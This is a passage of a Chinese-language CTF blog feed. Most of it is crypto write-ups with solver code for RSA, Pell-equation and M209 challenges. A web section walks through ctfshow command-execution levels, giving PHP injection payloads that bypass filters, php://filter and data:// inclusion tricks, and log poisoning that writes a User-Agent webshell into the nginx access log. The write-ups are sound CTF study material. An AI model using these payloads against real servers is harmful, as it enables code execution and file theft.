class="string">&quot;cipher&quot;</span>]</span><br><span class="line"></span><br><span class="line">        cipher = cipher.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)[<span class="number">10</span>:-<span class="number">10</span>]        <span class="comment"># remove head and tail</span></span><br><span class="line">        <span class="built_in">print</span>(cipher)</span><br><span class="line">        <span class="keyword">if</span> cipher[i] == c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;flag[i] is&#x27;</span>, ch)</span><br><span class="line">            <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(ct):</span><br><span class="line">    flag += rua(c, i)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>这个是发现了规律的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ciphertext</span>(<span class="params">s</span>):</span><br><span class="line">    url = <span class="string">&quot;http://03.cr.yp.toc.tf:11117/m209/encipher&quot;</span></span><br><span class="line">    data = &#123; <span class="string">&quot;plain&quot;</span>: s &#125;</span><br><span class="line">    res = requests.post(url, data)</span><br><span class="line">    <span class="keyword">return</span> json.loads(res.text)[<span class="string">&quot;cipher&quot;</span>]</span><br><span class="line"></span><br><span class="line">st = <span class="string">&quot;IISNJ IFFAA TYPMO WDJHA ZMNBD LKUAY TYPVD UGAYU OQMOO YRVUS SLFZI IXKVW LYUGT JWTYV XNEYU HLQVV IXUMJ BKNUQ WMLQT QKIWV UXOCA CVSPG UKJQG XCSFI RJEKU BWLBM AVRFW DMOPT VFXTD VROND XSEHF ZLWEJ VOVSX IISNJ IFFAA&quot;</span></span><br><span class="line"></span><br><span class="line">en = <span class="string">&quot;A&quot;</span> * <span class="number">155</span></span><br><span class="line">en = get_ciphertext(en)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(st))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(en))</span><br><span class="line">res = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(st)):</span><br><span class="line">    <span class="keyword">if</span> st[i] == en[i] <span class="keyword">and</span> st[i] == <span class="string">&quot; &quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    cc = <span class="built_in">bytes</span>([(<span class="built_in">ord</span>(en[i]) - <span class="built_in">ord</span>(st[i])) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Z&quot;</span> == cc:</span><br><span class="line">        res += <span class="string">b&quot; &quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += cc</span><br><span class="line"><span class="built_in">print</span>(res)  </span><br></pre></td></tr></table></figure><p>CCTF{OOJMPMDDIXCLNNWFTEJUMFXKBRVVMOPSLSSLUTXVDVNDMYYPHPWFJRNJBVBOMUYR}</p><h1 id="medium">MEDIUM</h1><h2 id="aniely">Aniely</h2><p>key = passphrase^flag</p><p>enc = passphrase ^ E(key)^rand</p><p>rand = urandom(2) * 16</p><p>flag开头两字节为'CC'</p><p>因此rand可求</p><h2 id="diploma">Diploma</h2><h2 id="oak-land">Oak land</h2><h2 id="cantilever">Cantilever</h2><h2 id="side-step">Side step</h2><h2 id="faonsa">Faonsa</h2><h2 id="resign">Resign</h2><h2 id="dbb">DBB</h2><h2 id="fiercest">Fiercest</h2><h2 id="mino">Mino</h2><h2 id="starter-ecc">Starter ECC</h2><h1 id="medium-hard">MEDIUM-HARD</h1><h2 id="watery-soup">Watery soup</h2><h2 id="loyal">313 Loyal</h2><h2 id="soda">Soda</h2><h2 id="sparse">Sparse</h2><h2 id="larisa">Larisa</h2><h2 id="shaim">Shaim</h2><h2 id="lagima">Lagima</h2><h2 id="versace">Versace</h2><h1 id="hard">HARD</h1><h2 id="persian-cat">Persian cat</h2><h2 id="nlcs">NLCS</h2><h2 id="gsdp">GSDP</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;复盘咯&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA, math" scheme="http://sh1k4ku.github.io/tags/RSA-math/"/>
    
  </entry>
  
  <entry>
    <title>DSCTF</title>
    <link href="http://sh1k4ku.github.io/2022/07/17/2022/DSCTF/"/>
    <id>http://sh1k4ku.github.io/2022/07/17/2022/DSCTF/</id>
    <published>2022-07-17T03:01:56.000Z</published>
    <updated>2022-07-17T08:54:20.612Z</updated>
    
    <content type="html"><![CDATA[<p>俺拉了</p><span id="more"></span><h1 id="picproblem">picproblem</h1><p>套娃，pell + 逆图片+已知dp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array, zeros, uint8</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="comment"># n =  85413323752199019806030766630760449394238054889872415531186815348349883843039718091361611175963675771467536496812507338620957273406076058263122453235926619595761737396698699834116678598534261542535530241537247151318756003375573850725841254167462648747492270335084402716816450008370008491069875351593380154253</span></span><br><span class="line"><span class="comment"># dp =  1576424214336939000475035870826282526256046059505538052583882122452307602095912733650442447289122473348318614749578285418144935611098423641334952097553125</span></span><br><span class="line"><span class="comment"># c =  53653254613997095145108444611576166902006080900281661447007750088487109015427510365774527924664116641019490904245926171500894236952984157500461367769566121581870986304353174732328118576440353500038670030097108081972287049673200783198844842527470746431369314585103203118824985764754487936404004696485346196488</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for x in range(1, e):</span></span><br><span class="line"><span class="comment"># if(e*dp%x==1):</span></span><br><span class="line"><span class="comment"># p=(e*dp-1)//x+1</span></span><br><span class="line"><span class="comment"># if(n%p!=0):</span></span><br><span class="line"><span class="comment"># continue</span></span><br><span class="line"><span class="comment"># q=n//p</span></span><br><span class="line"><span class="comment"># phin=(p-1)*(q-1)</span></span><br><span class="line"><span class="comment"># d = gp.invert(e, phin)</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(pow(c, d, n)))</span></span><br><span class="line"><span class="comment"># m = b&#x27;*********** kn = 8 **************&#x27;</span></span><br><span class="line">image = cv2.imread(<span class="string">&quot;flag.jpg&quot;</span>)</span><br><span class="line">img_gray = cv2.cvtColor(image,cv2.COLOR_RGB2GRAY)</span><br><span class="line">imagearray = array(img_gray)</span><br><span class="line">h = <span class="built_in">len</span>(imagearray)</span><br><span class="line">w = <span class="built_in">len</span>(imagearray[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pell</span>(<span class="params">N, numTry = <span class="number">1000</span></span>):</span><br><span class="line">    cf= continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span>-N*denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer,denom</span><br><span class="line">x, y = solve_pell(<span class="number">903751</span>, <span class="number">2000</span>)</span><br><span class="line">kn = <span class="number">8</span></span><br><span class="line">x = <span class="number">1524993807674193841904821512553946379967374698278296055158206699585083472817489721493862711615915407326315660670541801753616900039772802728925226091475860689682871555641241500183892397513037971186709123629077584204226084524811673794984687840178772052545441242927492902583547355565525538664836516589721942980577095421561886873928634330640979800040574060218872787212426630202508118484269553983399179155489583316400107655564222453437462724749097265122300644936717434151331633092585140183510349369422527440264746843972834927860065578557836150798690530172694679514231722613822246810010130005324032492360889531553803832398604563088256410481865243771216990603166993198935358471831328395618477974126824762560872337594997394218234427050399655270848385995088586420526886397320949350980406936200217112040971433660322179072288438842964957568719036794320203116263329623589339367497303140938070334557345834226085189140858264388063745189833584962825509843279678826240558480527560</span></span><br><span class="line">y = <span class="number">1604145232044543633656616254647708451166351104281510395737885491696385806407267633308545985473789119651681711082023113933085624628557168423578747544761597312012713558891523798820667618256495398479378172124019360339427592449217208805888502769358288779859969965560832505104388955091637704481336716722418336373334467787371085728212260231330510705797124224353810509272250940285165605853594811893804251478850270703294638335268305881655491870226553141286503109543313414279220480589704210363277523457948607498351377843904335637032510420141505975997452077477296326035048463179997347136990808017374750824810458605412236391952910679246288287664717533857743462935708681309073915761377477454479206054016260422865457862565353002789887917196437750618212918420129464330488021272187952177063175896447842395209693304502304253471733746765257510395226972224876277717457205220726240042035259947453816668460757995771018155703600926745905595162857982860955545877343914746294034180707</span></span><br><span class="line"><span class="keyword">assert</span> <span class="number">1301149798051259562945444365741194129602596348352064372203373</span>*<span class="built_in">pow</span>(x, <span class="number">2</span>) == <span class="number">1175915431138623881271508290982969935822476052419526528443170552123</span>*<span class="built_in">pow</span>(y, <span class="number">2</span>) + <span class="number">1301149798051259562945444365741194129602596348352064372203373</span></span><br><span class="line">x1 = <span class="built_in">round</span>(x/y*<span class="number">0.001</span>, <span class="number">16</span>)</span><br><span class="line">u1 = y*<span class="number">3650</span>/x</span><br><span class="line">x2 = <span class="built_in">round</span>(x/y*<span class="number">0.00101</span>, <span class="number">16</span>)</span><br><span class="line">u2 = y*<span class="number">3675</span>/x</span><br><span class="line">x3 = <span class="built_in">round</span>(x/y*<span class="number">0.00102</span>, <span class="number">16</span>)</span><br><span class="line">u3 = y*<span class="number">3680</span>/x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line"><span class="built_in">print</span>(kt)</span><br><span class="line"><span class="built_in">print</span>(h, w)</span><br><span class="line"></span><br><span class="line">temp_image = zeros(shape=[h, w, <span class="number">3</span>], dtype=uint8)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp_image))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp_image[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp_image[<span class="number">0</span>][<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, kn):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, w):</span><br><span class="line">            x1 = u1 * x1 * (<span class="number">1</span> - x1)</span><br><span class="line">            x2 = u2 * x2 * (<span class="number">1</span> - x2)</span><br><span class="line">            x3 = u3 * x3 * (<span class="number">1</span> - x3)</span><br><span class="line">            r1 = <span class="built_in">int</span>(x1 * <span class="number">255</span>)</span><br><span class="line">            r2 = <span class="built_in">int</span>(x2 * <span class="number">255</span>)</span><br><span class="line">            r3 = <span class="built_in">int</span>(x3 * <span class="number">255</span>)</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">                temp_image[i][j][t] = (((r1 + r2) ^ r3) - imagearray[i][j]) % <span class="number">256</span></span><br><span class="line">    x1 = kt[<span class="number">0</span>]</span><br><span class="line">    x2 = kt[<span class="number">1</span>]</span><br><span class="line">    x3 = kt[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br></pre></td></tr></table></figure><h1 id="rsa330">RSA330</h1><p><a href="https://eprint.iacr.org/2022/271.pdf#:~:text=The%20point%20of%20approximate%20divisor%20multiples%20is%20that,we%20rely%20on%20a%20standard%20Coppersmith-%20type%20heuristic.">paper链接</a></p><p>哎本来能做出来的，最后一直copper不出来，也算督促自己了T-T</p><p>题目分三步，factor-用paper的方法求kl-copper</p><p>第二步和第三步不一定有解</p><p>copper最后得到的小范式单项式用基本方法、groebner都可以出解</p><h1 id="approximate">approximate</h1><p>RSA copper了一天，这题都没看。。复盘的时候发现不是很难 <span class="math display">\[x_1 = p * pp\\x_2 = q * qq\\n = (p+x)*(q+y)\\\because x、y\; is\;small\\\therefore x_1x_2/n + x \approx pp*qq \;|\;x_1x_2\]</span> 不过x的界要自己找</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;俺拉了&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="coppersmith" scheme="http://sh1k4ku.github.io/tags/coppersmith/"/>
    
    <category term="Pell Equation" scheme="http://sh1k4ku.github.io/tags/Pell-Equation/"/>
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>web</title>
    <link href="http://sh1k4ku.github.io/2022/07/11/2022/web/"/>
    <id>http://sh1k4ku.github.io/2022/07/11/2022/web/</id>
    <published>2022-07-11T02:11:09.000Z</published>
    <updated>2022-07-18T10:08:18.016Z</updated>
    
    <content type="html"><![CDATA[<p>学点web</p><span id="more"></span><h1 id="信息收集">信息收集</h1><p><a href="https://blog.csdn.net/zmx2473162621/article/details/115284712">wp</a></p><p><a href="https://wkr.moe/ctf/447.html#web15%5B%E7%A4%BE%E5%B7%A5%5D">wp2</a></p><p><a href="https://blog.csdn.net/a597934448/article/details/105431367">各种泄露</a></p><h1 id="命令执行">命令执行</h1><p><a href="https://blog.csdn.net/solitudi/article/details/109837640">y4的wp</a></p><p>一些基本提取文件的操作：cat、nl、tac、highlight_file()、vim、vi</p><p>匹配：*多个字符匹配，?单个字符匹配</p><p>转义符：^、""、''</p><p>执行函数echo()、system()、passthru() 、exec()、shell_exec()、popen()、proc_open()、pcntl_exec()</p><h2 id="web29">web29</h2><p>只过滤了flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;nl fla*&quot;</span>);<span class="comment">//匹配</span></span><br><span class="line">c=<span class="keyword">echo</span> `nl fl<span class="string">&#x27;&#x27;</span>ag.php`;<span class="comment">//转义字符</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);<span class="comment">//因为只过滤c的flag，所以用1传参不会被过滤</span></span><br></pre></td></tr></table></figure><h2 id="web30">web30</h2><p>过滤了flag、system、php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;nl fla?????&#x27;</span>);</span><br></pre></td></tr></table></figure><p>和上一问差不多</p><h2 id="web31">web31</h2><p>过滤了很多，"/flag|system|php|cat|sort|shell|.||'/i"（/i大小写不敏感）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);<span class="comment">//没过滤eval，用1传参</span></span><br><span class="line">c=<span class="keyword">echo</span>(`nl%<span class="number">09</span>fl[abc]*`);<span class="comment">//%09空格转义，[abc]匹配不包含abc的文字</span></span><br><span class="line">c=<span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;nl%09fl[a]*&quot;</span>);<span class="comment">//等价于system()</span></span><br><span class="line">c=<span class="keyword">echo</span>`strings\<span class="variable">$IFS</span>\$<span class="number">9</span>f*`<span class="comment">//\$IFS\$9 win下空格转义</span></span><br></pre></td></tr></table></figure><p>查文件路径的语法：</p><p>首先<code>print_r(scandir(dirname(__FILE__)));</code>查看当前目录下文件</p><p>然后找到flag.php<code>print_r(next(array_reverse(scandir(dirname(__FILE__)))));</code>之后高亮显示即可<code>c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</code></p><p><code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code>和上面的差不多</p><h2 id="web32">web32</h2><p>过滤的更多了：("/flag|system|php|cat|sort|shell|.||'|`|echo|;|(/i"</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$nice</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]<span class="meta">?&gt;</span>&amp;url=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php//这个$nice=暂且不知道是干啥的，去掉也能执行</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt; //伪协议，下一个也是</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/wjrblogs/p/12285202.html">伪协议</a></p><h2 id="web33">web33</h2><p>比32多过滤了个双引号，所以要把“url"改成1："/flag|system|php|cat|sort|shell|.||'|`|echo|;|(|"/i"</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web34">web34</h2><p>多了个':'："/flag|system|php|cat|sort|shell|.||'|`|echo|;|(|:|"/i"</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web35">web35</h2><p>多了小于和等于："/flag|system|php|cat|sort|shell|.||'|`|echo|;|(|:|"|&lt;|=/i"</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web36">web36</h2><p>多了数字："/flag|system|php|cat|sort|shell|.||'|`|echo|;|(|:|"|&lt;|=|/|[0-9]/i"</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web37">web37</h2><p>变成了文件包含</p><p><img src="../images/web/image-20220718144945562.png" alt="image-20220718144945562"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br><span class="line"><span class="comment">//还可以配合UA头执行日志包含</span></span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>UA头写马执行日志操作：</p><ol type="1"><li><p>先用c=/var/log/nginx/access.log发现能看日志<img src="../images/web/image-20220718161423024.png" alt="image-20220718161423024"></p></li><li><p>User-Agent头写马：</p><p><img src="../images/web/image-20220718161940874.png" alt="image-20220718161940874"></p><p>User-Agent: <?php eval($_POST[1]);?></p></li><li><p>再看日志<img src="../images/web/image-20220718162107763.png" alt="image-20220718162107763"></p></li><li><p>然后就可以命令执行了：</p><p><img src="../images/web/image-20220718162135410.png" alt="image-20220718162135410"></p></li><li><p>1=system("nl flag.php");</p><p><img src="../images/web/image-20220718162225485.png" alt="image-20220718162225485"></p></li></ol><h2 id="web38">web38</h2><p>"/flag|php|file/i"</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br><span class="line"><span class="comment">//还可以配合UA头执行日志包含</span></span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>和上一题差不多</p><h2 id="web39">web39</h2><p><img src="../images/web/image-20220718165432040.png" alt="image-20220718165432040"></p><p>用<code>c=data://text/plain,&lt;?=phpinfo();?&gt;</code>测试后缀有无影响，发现无：</p><p><img src="../images/web/image-20220718170657074.png" alt="image-20220718170657074"></p><p>.php因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用。data协议后有个?&gt;,已经闭合前面的php代码，所以后面的php拼接，不会影响php代码的执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web40">web40</h2><p>"/[0-9]|~|`|@|#|\$|%|^|&amp;|*|（|）|-|=|+|{|[|]|}|:|'|"|,|&lt;|.|&gt;|/|?|\\/i"</p><h2 id="web41">web41</h2><h2 id="web42">web42</h2><h2 id="web43">web43</h2><h2 id="web44">web44</h2><h2 id="web45">web45</h2><h2 id="web46">web46</h2><h2 id="web47">web47</h2><h2 id="web48">web48</h2><h2 id="web49">web49</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;学点web&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="http://sh1k4ku.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>做题记录</title>
    <link href="http://sh1k4ku.github.io/2022/07/09/2022/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://sh1k4ku.github.io/2022/07/09/2022/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2022-07-09T08:46:05.000Z</published>
    <updated>2022-07-12T09:13:17.392Z</updated>
    
    <content type="html"><![CDATA[<p>做题</p><span id="more"></span><h1 id="cycling">cycling</h1><h2 id="carmichael-function">Carmichael function</h2><p><span class="math display">\[定义为a^{m} \equiv 1 \;mod\;n成立的最小正整数m，其中( a , n ) = 1 ，将m记作\lambda(n)\\换言之，如果a^{m} \equiv 1 \;mod\;n，则m\;|\;\lambda(n)\]</span></p><h2 id="carmichael定理">Carmichael定理</h2><p><span class="math display">\[\lambda(p^r)=\left\{\begin{aligned}&amp; \varphi(p^r) \;if\;p^r = \;2,3^r,4,5^r,7^r等奇数素数以及2、4 \\&amp; \frac{1}{2}\varphi(p^r) \;if\;p^r = \;8,16,32,64等2的3次幂以上\\\end{aligned}\right.\]</span></p><h2 id="计算lambdan">计算<span class="math display">\[\lambda(n)\]</span></h2><p>由整数分解定理 <span class="math display">\[n = p{_{1}^{r_1}}p{_{2}^{r_2}}···p{_{n}^{r_n}}\]</span> 那么 <span class="math display">\[\lambda(n) =lcm(\lambda(p{_{1}^{r_1}}),\lambda(p{_{2}^{r_2}}),···,\lambda(p{_{n}^{r_n}}))\]</span></p><p>h+1易分解为17个小素数，且没有2次及以上的素数 <span class="math display">\[\because h+1\; |\;\lambda(\lambda(n))\\\therefore 用primes相乘+1判断是否为素数，并凑出可能的\lambda(n)\\\]</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span 